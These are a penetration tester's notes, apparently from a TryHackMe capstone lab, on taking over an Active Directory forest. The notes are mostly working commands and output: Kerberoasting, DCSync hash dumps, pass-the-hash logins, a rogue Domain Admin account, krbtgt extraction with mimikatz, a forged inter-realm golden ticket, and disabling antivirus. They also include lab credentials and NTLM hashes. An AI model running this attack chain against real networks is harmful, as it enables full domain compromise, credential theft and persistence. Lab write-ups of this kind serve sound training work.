`10.200.118.102 CORPDC.thereserve.loc corp.thereserve.loc`

# BloodHound
```bash
pipx install bloodhound
  installed package bloodhound 1.6.1, installed using Python 3.11.2
  These apps are now globally available
    - bloodhound-python
done! ✨ 🌟 ✨

proxychains bloodhound-python -u 'laura.wood' -p 'Password1@' -d corp.thereserve.loc -c all -ns 10.200.118.102 --dns-tcp

dns.resolver.LifetimeTimeout: The resolution lifetime expired after 3.113 seconds: Server 10.200.118.102 TCP port 53 answered The DNS operation timed out.

proxychains bloodhound-python -d corp.thereserve.loc -u laura.wood -p 'Password1@'  -c all -ns 10.200.118.102 --dns-tcp
```

* -c ALL All collection methods
* -d domain name
* -dc DC name
* -ns use $IP as the DNS server
*  --dns-tcp for the DNS resolution to work through the proxy (proxychains).

# Kerberoasting 
```bash
proxychains impacket-GetUserSPNs -request -dc-ip $IP corp.thereserve.loc/laura.wood:'Password1@'
```

```bash
hashcat -m 13100 -a 0 svcScanning.hash /usr/share/wordlists/rockyou.txt --force
```

`corp.thereserve.loc/svcScanning:Password1!`
-> Go to Server1. It's rdp free account via admin privilege.

# Enum
### SMB

```bash
proxychains crackmapexec smb $IP -u svcScanning -p Password1!
SMB         10.200.113.102  445    CORPDC           [*] Windows 10.0 Build 17763 x64 (name:CORPDC) (domain:corp.thereserve.loc) (signing:True) (SMBv1:False)
SMB         10.200.113.102  445    CORPDC           [+] corp.thereserve.loc\svcScanning:Password1!

proxychains smbmap -H $IP -u svcScanning -p Password1!

[+] IP: 10.200.113.102:445      Name: 10.200.113.102                                    
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        IPC$                                                    READ ONLY       Remote IPC
        NETLOGON                                                READ ONLY       Logon server share 
        SYSVOL                                                  READ ONLY       Logon server share 
```

### Bloodhound
-> Go to Server1. It's rdp free account via admin privilege.

# DCSync
-> Coming from Server1 since got the svcBackup account.
```bash
proxychains impacket-secretsdump corp.thereserve.loc/svcBackups:'q9nzssaFtGHdqUV3Qv6G'@$IP

Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[proxychains] Strict chain  ...  127.0.0.1:1085  ...  10.200.113.102:445  ...  OK
[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
[proxychains] Strict chain  ...  127.0.0.1:1085  ...  10.200.113.102:135  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1085  ...  10.200.113.102:49667  ...  OK

Administrator:500:aad3b435b51404eeaad3b435b51404ee:58a478135a93ac3bf058a5ea0e8fdb71:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:0c757a3445acb94a654554f3ac529ede:::
THMSetup:1008:aad3b435b51404eeaad3b435b51404ee:0ea3e204f310f846e282b0c7f9ca3af2:::
lisa.moore:1125:aad3b435b51404eeaad3b435b51404ee:e4c1c1ba3b6dbdaf5b08485ce9cbc1cf:::
lisa.jenkins:1126:aad3b435b51404eeaad3b435b51404ee:94ef2aa6af7f6397e4164b40afb86eef:::
```


# Root
```bash
proxychains evil-winrm -i $IP -u Administrator -H d3d4edcc015856e386074795aea86b3e

Info: Establishing connection to remote endpoint
[proxychains] Strict chain  ...  127.0.0.1:1085  ...  10.200.113.102:5985  ...  OK
*Evil-WinRM* PS C:\Users\Administrator\Documents> hostname
CORPDC
```

`58a478135a93ac3bf058a5ea0e8fdb71	NTLM	Password123`

`d3d4edcc015856e386074795aea86b3e` NTLM is the empty pass.

### Set Password not empty to enable RDP
```powershell
*Evil-WinRM* PS C:\Users\Administrator\Documents> $env:USERNAME
Administrator

*Evil-WinRM* PS C:\Users\Administrator\Documents> Set-LocalUser -Name $env:USERNAME -Password (ConvertTo-SecureString -AsPlainText "Password123" -Force)

```

### Turn off all AV after RDP in it

# Get the left over flag for Server1&2

```powershell
*Evil-WinRM* PS C:\Users\Administrator\Documents> $username = 'Administrator'
*Evil-WinRM* PS C:\Users\Administrator\Documents> $password = ConvertTo-SecureString "Password123" -AsPlainText -Force
*Evil-WinRM* PS C:\Users\Administrator\Documents> $psCred = New-Object System.Management.Automation.PSCredential -ArgumentList ($username, $password)
*Evil-WinRM* PS C:\Users\Administrator\Documents> Enter-PSSession -ComputerName WRK1 -Credential $psCred
You are currently in a Windows PowerShell PSSession and cannot use the Enter-PSSession cmdlet to enter another PSSession.

*Evil-WinRM* PS C:\Users\Administrator\Documents> $session = New-PSSession -ComputerName WRK1.corp.thereserve.loc -Authentication Negotiate -Credential $psCred

*Evil-WinRM* PS C:\Users\Administrator\Documents> Invoke-Command -Session $session -ScriptBlock {hostname}

WRK1
*Evil-WinRM* PS C:\Users\Administrator\Documents> Invoke-Command -Session $session -ScriptBlock {echo "8020790e-920a-42ca-8205-956041a7b4d5" | Set-Content C:\Users\Administrator\AlvinSmith.txt}
```

# Sum up as Tier 0 done

So far the entire Corporate Division compromised. 

1. The WebServer can be used to build a userlist, and we have the password policy.
2. The MailServer has an open SMTP port, resulting in a brute force attack to gain access to the user `laura`.
3. WRK1 allows RDP access as `laura`.
4. The VPNServer can be logged in using the same credentials.
5. The VPNServer panel has a command injection vulnerability and can be exploited to achieve remote code execution and gain root access. Setup pivoting after root.
7. DC suffers Kerberoasting, therefore get another footholder user svcScanning for Server1
8. Server1 Lateral movement with `secretdump` to get another user who has DCSync privilege. 
9. The DC was fully compromised through a DCSync attack by using `svcBackups` user.
10. Post Exploitation to go to the next stage

# Post Exploitation
### New DC Admin
```powershell
Import-Module ActiveDirectory

# Create the new user
New-ADUser -SamAccountName "baturu" -UserPrincipalName "baturu@corp.thereserve.loc" -Name "Baturu" -GivenName "Baturu" -Surname "Lastname" -AccountPassword (ConvertTo-SecureString -AsPlainText "YourPassword123" -Force) -Enabled $true

# Add the user to Domain Admins group
Add-ADGroupMember -Identity "Domain Admins" -Members "baturu"

# Add the user to Administrators group
Add-ADGroupMember -Identity "Administrators" -Members "baturu"

# Add the user to Enterprise Admins group (optional)
Add-ADGroupMember -Identity "Enterprise Admins" -Members "baturu"
```

### Enum
```powershell
# To retrieve the FQDN of the local computer:
PS C:\Windows\system32> [System.Net.Dns]::GetHostByName($env:COMPUTERNAME).HostName
>>
CORPDC.corp.thereserve.loc

# To get the domain name of the current user's domain:
PS C:\Windows\system32> $env:USERDOMAIN
>>
CORP

# To obtain the domain information for the current user's domain:
PS C:\Windows\system32> Get-ADDomain
>>
AllowedDNSSuffixes                 : {}
ChildDomains                       : {}
ComputersContainer                 : CN=Computers,DC=corp,DC=thereserve,DC=loc
DeletedObjectsContainer            : CN=Deleted Objects,DC=corp,DC=thereserve,DC=loc
DistinguishedName                  : DC=corp,DC=thereserve,DC=loc
DNSRoot                            : corp.thereserve.loc
DomainControllersContainer         : OU=Domain Controllers,DC=corp,DC=thereserve,DC=loc
DomainMode                         : Windows2012R2Domain
DomainSID                          : S-1-5-21-170228521-1485475711-3199862024
ForeignSecurityPrincipalsContainer : CN=ForeignSecurityPrincipals,DC=corp,DC=thereserve,DC=loc
Forest                             : thereserve.loc
InfrastructureMaster               : CORPDC.corp.thereserve.loc
LastLogonReplicationInterval       :
LinkedGroupPolicyObjects           : {CN={31B2F340-016D-11D2-945F-00C04FB984F9},CN=Policies,CN=System,DC=corp,DC=theres
                                     erve,DC=loc}
LostAndFoundContainer              : CN=LostAndFound,DC=corp,DC=thereserve,DC=loc
ManagedBy                          :
Name                               : corp
NetBIOSName                        : CORP
ObjectClass                        : domainDNS
ObjectGUID                         : 61de4fa9-9fef-4eec-a650-1872e1a1e415
ParentDomain                       : thereserve.loc
PDCEmulator                        : CORPDC.corp.thereserve.loc
PublicKeyRequiredPasswordRolling   :
QuotasContainer                    : CN=NTDS Quotas,DC=corp,DC=thereserve,DC=loc
ReadOnlyReplicaDirectoryServers    : {}
ReplicaDirectoryServers            : {CORPDC.corp.thereserve.loc}
RIDMaster                          : CORPDC.corp.thereserve.loc
SubordinateReferences              : {DC=DomainDnsZones,DC=corp,DC=thereserve,DC=loc}
SystemsContainer                   : CN=System,DC=corp,DC=thereserve,DC=loc
UsersContainer                     : CN=Users,DC=corp,DC=thereserve,DC=loc

# To list all the domains in the forest:
PS C:\Windows\system32> Get-ADForest | Select-Object -ExpandProperty Domains
>>
bank.thereserve.loc
corp.thereserve.loc

# To retrieve the forest information:
PS C:\Windows\system32> Get-ADForest
>>

ApplicationPartitions : {DC=ForestDnsZones,DC=thereserve,DC=loc, DC=DomainDnsZones,DC=thereserve,DC=loc,
                        DC=DomainDnsZones,DC=corp,DC=thereserve,DC=loc, DC=DomainDnsZones,DC=bank,DC=thereserve,DC=loc}
CrossForestReferences : {}
DomainNamingMaster    : ROOTDC.thereserve.loc
Domains               : {bank.thereserve.loc, corp.thereserve.loc, thereserve.loc}
ForestMode            : Windows2012R2Forest
GlobalCatalogs        : {ROOTDC.thereserve.loc, BANKDC.bank.thereserve.loc, CORPDC.corp.thereserve.loc}
Name                  : thereserve.loc
PartitionsContainer   : CN=Partitions,CN=Configuration,DC=thereserve,DC=loc
RootDomain            : thereserve.loc
SchemaMaster          : ROOTDC.thereserve.loc
Sites                 : {Default-First-Site-Name}
SPNSuffixes           : {}
UPNSuffixes           : {}
```

### Mimikatz
```powershell
upload ../Capstone_Challenge_Resources/Tools/mimikatz_trunk/x64/mimikatz.exe

mimikatz # privilege::debug
Privilege '20' OK

mimikatz # lsadump::dcsync /domain:corp.thereserve.loc /user:krbtgt
[DC] 'corp.thereserve.loc' will be the domain
[DC] 'CORPDC.corp.thereserve.loc' will be the DC server
[DC] 'krbtgt' will be the user account
[rpc] Service  : ldap
[rpc] AuthnSvc : GSS_NEGOTIATE (9)
ERROR kull_m_rpc_drsr_CrackName ; CrackNames (name status): 0x00000003 (3) - ERROR_NOT_UNIQUE

mimikatz # lsadump::dcsync /user:corp.thereserve.loc\krbtgt
[DC] 'corp.thereserve.loc' will be the domain
[DC] 'CORPDC.corp.thereserve.loc' will be the DC server
[DC] 'corp.thereserve.loc\krbtgt' will be the user account
[rpc] Service  : ldap
[rpc] AuthnSvc : GSS_NEGOTIATE (9)
ERROR kull_m_rpc_drsr_CrackName ; CrackNames (name status): 0x00000002 (2) - ERROR_NOT_FOUND
```

##### Debugging above
The domain name `corp.thereserve.loc` doesn't work. https://tryhackme.com/room/exploitingad As `mimikatz # lsadump::dcsync /user:za\krbtgt` THM suggested, let's try just NetBIOS name.

```txt ChatGPT
When people refer to the "domain name," it can sometimes be ambiguous whether they are referring to the NetBIOS name or the FQDN. To avoid confusion, it's helpful to clarify which specific name they are referring to in a conversation or context.

The NetBIOS name is a short, single-label name used in earlier versions of Windows and is limited to 15 characters. It is often in uppercase letters and can be used to refer to a domain or computer within the domain. For example, "CORP" is a NetBIOS name.

The FQDN, on the other hand, represents the complete domain hierarchy and includes multiple labels separated by periods. It provides a more complete and specific identification of the domain. For example, "corp.thereserve.loc" is an FQDN.
```

```powershell
mimikatz # lsadump::dcsync /user:corp\krbtgt
[DC] 'corp.thereserve.loc' will be the domain
[DC] 'CORPDC.corp.thereserve.loc' will be the DC server
[DC] 'corp\krbtgt' will be the user account
[rpc] Service  : ldap
[rpc] AuthnSvc : GSS_NEGOTIATE (9)

Object RDN           : krbtgt

** SAM ACCOUNT **

SAM Username         : krbtgt
Account Type         : 30000000 ( USER_OBJECT )
User Account Control : 00010202 ( ACCOUNTDISABLE NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Account expiration   :
Password last change : 9/7/2022 9:58:08 PM
Object Security ID   : S-1-5-21-170228521-1485475711-3199862024-502
Object Relative ID   : 502

Credentials:
  Hash NTLM: 0c757a3445acb94a654554f3ac529ede
    ntlm- 0: 0c757a3445acb94a654554f3ac529ede
    lm  - 0: d99b85523676a2f2ec54ec88c75e62e7

Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : 8fea6537ee7adab6de1320740dbac5ba

* Primary:Kerberos-Newer-Keys *
    Default Salt : CORP.THERESERVE.LOCkrbtgt
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : 899f996a627a04466da18a4c09d0d7e9a26edf5667518ee1af1e21df7e88e055
      aes128_hmac       (4096) : 7b3bb3c8cb4d2088bcf66834e1ee25d7
      des_cbc_md5       (4096) : 4c7f49bc8c43ae5b

* Primary:Kerberos *
    Default Salt : CORP.THERESERVE.LOCkrbtgt
    Credentials
      des_cbc_md5       : 4c7f49bc8c43ae5b
      
* Packages *
    NTLM-Strong-NTOWF

* Primary:WDigest *
    01  bae6fd4b82843d9e4d304a4badd9b3f8
    02  7f332daf2c53d030c3e1076c5506f8af
    03  09f55a268975ffa5244d82e245d9e1f3
    04  bae6fd4b82843d9e4d304a4badd9b3f8
    05  7f332daf2c53d030c3e1076c5506f8af
    06  872316813a9d0814fe25b0d0c0c67101
    07  bae6fd4b82843d9e4d304a4badd9b3f8
    08  e7cbfcb0558fd7d4979515002317684d
    09  e7cbfcb0558fd7d4979515002317684d
    10  d9c112011bbb88f369434b1c3e5afbe3
    11  19a08015dd7b512161a9269323c55f12
    12  e7cbfcb0558fd7d4979515002317684d
    13  50360843f3176c9a56d3aefeac757c55
    14  19a08015dd7b512161a9269323c55f12
    15  7b0bdda7cc7268092df91053be2f5d25
    16  7b0bdda7cc7268092df91053be2f5d25
    17  d548cf98bbdabe31fe5cb8251d8b624a
    18  b60aa3723fa51ae095543d456e9b17a1
    19  0cfcca0f2199155baa3a59b8bdb92f52
    20  cb420dd8b676f6c3f15a89b20655a1a5
    21  4148bcefac3662e143c134a4c2510fa3
    22  4148bcefac3662e143c134a4c2510fa3
    23  820979836790306094f15310fe7ef93a
    24  89f0a69ffe9366fccea16edbcbb2004c
    25  89f0a69ffe9366fccea16edbcbb2004c
    26  1304d0542c27897048a5a0df97a8bcf2
    27  f4e1a0222a78e49dd367bf491350ffd1
    28  f8fd60d4a6d4471d27e270ad91f9f416
    29  23cb7ac89d73a8ad38673dd39afab810
```
##### KRBTGT and Golden Tickets
```txt
KRBTGT is the account used for Microsoft's implementation of Kerberos. The name is derived from Kerberos (KRB) and Ticket Granting Ticket (TGT). Essentially, this account acts as the service account for the Kerberos Distribution Center (KDC) service, which handles all Kerberos ticket requests. This account is used to encrypt and sign all Kerberos tickets for the domain. Since the password hash is shared by all domain controllers, they can then verify the authenticity of the received TGT when users request access to resources.

However, what if we want to generate our own TGTs to grant us access to everything? This is known as a Golden Ticket attack. In a Golden Ticket attack, we bypass the KDC altogether and create our own TGTs, essentially becoming a Ticket Granting Server (TGS). In order to forge TGTs, we need the following information:

    The FQDN of the domain
    The Security Identifier (SID) of the domain
    The username of the account we want to impersonate
    The KRBTGT password hash

The first three are usually easy to recover. The last one requires a domain compromise since the KRBTGT password hash is only stored on domain controllers. Luckily for us, we have just compromised the Tier 0 admins group, so we are in a position to recover the KRBTGT password hash. 
```

As above, we already get KRBTGT hash and FQDN.

##### Inter-Realm TGTs
```txt
Using the KRBTGT password hash, we could now forge a Golden Ticket to access any resource in the child domain. This will also be discussed in more detail in the Persisting AD room. However, we can take this a step further by forging an Inter-Realm TGT. Inter-Realm TGTs are used to provide access to resources in other domains. In our case, we want to exploit the bidirectional trust relationship between the child and parent domain to gain full access to the parent domain.

We will include extra account SIDs from other domains when we construct the Golden Ticket to perform this exploit. Mimikatz can assist with this, allowing us to set the ExtraSids section of the KERB_VALIDATION_INFO structure of the Kerberos TGT. The ExtraSids section is described as “A pointer to a list of KERB_SID_AND_ATTRIBUTES structures that contain a list of SIDs corresponding to groups in domains other than the account domain to which the principal belongs”.

The key here is that we will exploit the trust the parent domain has with our child domain by adding the SID of the Enterprise Admins (EA) group as an extra SID to our forged ticket for the domain controller of the child domain. The EA group belongs to the parent domain and membership to this group essentially grants Administrative privileges over the entire forest! 

Before we can go into exploitation, we first need to recover two SIDs:

    The SID of the child domain controller (CORPDC), which we will impersonate in our forged TGT
    The SID of the Enterprise Admins in the parent domain, which we will add as an extra SID to our forged TGT
```

To recover these SIDs, we can use the AD-RSAT Powershell cmdlets. We can recover the SID of the child domain controller using the following command:
```powershell
# DC's hostname CORPDC
Get-ADComputer -Identity "CORPDC"

DistinguishedName : CN=CORPDC,OU=Domain Controllers,DC=corp,DC=thereserve,DC=loc
DNSHostName       : CORPDC.corp.thereserve.loc
Enabled           : True
Name              : CORPDC
ObjectClass       : computer
ObjectGUID        : 34336fec-45c0-42dd-82ff-8892d65bb412
SamAccountName    : CORPDC$
SID               : S-1-5-21-170228521-1485475711-3199862024-1009
UserPrincipalName :
```

We can recover the SID of the Enterprise Admins group using the following command to query the parent domain controller:
```powershell
# This is wrong
Get-ADGroup -Identity "Enterprise Admins" -Server ROOTDC.corp.thereserve.loc

# As we can see CN=CORPDC,OU=Domain Controllers,DC=corp,DC=thereserve,DC=loc
# CORPDC.corp.thereserve.loc = Hostname + FQDN
# We should just look into FQDN, and replace the NetBIOS name instead
Get-ADGroup -Identity "Enterprise Admins" -Server ROOTDC.thereserve.loc

DistinguishedName : CN=Enterprise Admins,CN=Users,DC=thereserve,DC=loc
GroupCategory     : Security
GroupScope        : Universal
Name              : Enterprise Admins
ObjectClass       : group
ObjectGUID        : 6e883913-d0cb-478e-a1fd-f24d3d0e7d45
SamAccountName    : Enterprise Admins
SID               : S-1-5-21-1255581842-1300659601-3764024703-519
```

##### Exploiting Domain Trusts
https://blog.netwrix.com/2022/08/31/complete-domain-compromise-with-golden-tickets/
```powershell
mimikatz # privilege::debug
Privilege '20' OK

kerberos::golden /user:Administrator /domain:corp.thereserve.loc /sid:S-1-5-21-170228521-1485475711-3199862024-1009 /service:krbtgt /rc4:0c757a3445acb94a654554f3ac529ede /sids:S-1-5-21-1255581842-1300659601-3764024703-519 /ptt

User      : Administrator
Domain    : corp.thereserve.loc (CORP)
SID       : S-1-5-21-170228521-1485475711-3199862024-1009
User Id   : 500
Groups Id : *513 512 520 518 519
Extra SIDs: S-1-5-21-1255581842-1300659601-3764024703-519 ;
ServiceKey: 0c757a3445acb94a654554f3ac529ede - rc4_hmac_nt
Service   : krbtgt
Lifetime  : 6/3/2023 10:14:41 AM ; 5/31/2033 10:14:41 AM ; 5/31/2033 10:14:41 AM
-> Ticket : ** Pass The Ticket **

 * PAC generated
 * PAC signed
 * EncTicketPart generated
 * EncTicketPart encrypted
 * KrbCred generated

Golden ticket for 'Administrator @ corp.thereserve.loc' successfully submitted for current session
```

##### Use(Pass) the Golden Ticket
```powershell
misc::cmd
```

First, we will verify that this ticket works for access to ROOTDC since it is a valid ticket for the Administrator user of the child domain:
```powershell
dir \\ROOTDC.thereserve.loc\c$



PS C:\Windows\system32> dir \\ROOTDC.thereserve.loc\c$


    Directory: \\ROOTDC.thereserve.loc\c$


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----       11/14/2018   6:56 AM                EFI
d-----        5/13/2020   6:58 PM                PerfLogs
d-r---         9/7/2022   4:58 PM                Program Files
d-----         9/7/2022   4:57 PM                Program Files (x86)
d-r---         6/3/2023   7:31 AM                Users
d-----         6/3/2023   6:43 AM                Windows
-a----         4/1/2023   4:10 AM            427 adusers_list.csv
-a----        3/17/2023   6:18 AM             85 dns_entries.csv
-a----        4/15/2023   8:52 PM        3162859 EC2-Windows-Launch.zip
-a----        4/15/2023   8:52 PM          13182 install.ps1
-a----        4/15/2023   8:51 PM           1812 thm-network-setup-dc.ps1
```

This at least confirms that the Golden Ticket was forged for access to the child DC. However, since we specified extra SIDs, we should also now have access to the parent DC:

`dir \\CORPDC.corp.thereserve.loc\c$` It works, not entirely necessary tho, since we are the domain admin of the DC.


# RDP to RootDC & BANKDC
I failed to get a PS session. Have to move the flag to get 15th and 16th done.
```powershell
*Evil-WinRM* PS C:\Users\Administrator\Documents> upload ../PSTools/PsExec64.exe

# OR
$sourceUrl = "http://10.200.113.12:9999/PsExec64.exe"
$destinationPath = "C:\path\to\save\PsExec64.exe"

Invoke-WebRequest -Uri $sourceUrl -OutFile $destinationPath
```

Both should work fine after AV turned off.

### Reset password for bankdc, rootdc

Creating new domain won't work until you got creds for their administrators.

![[Pasted image 20230605111943.png]]

RDP: `bank\Administrator` `Password1@`

-> BANKDC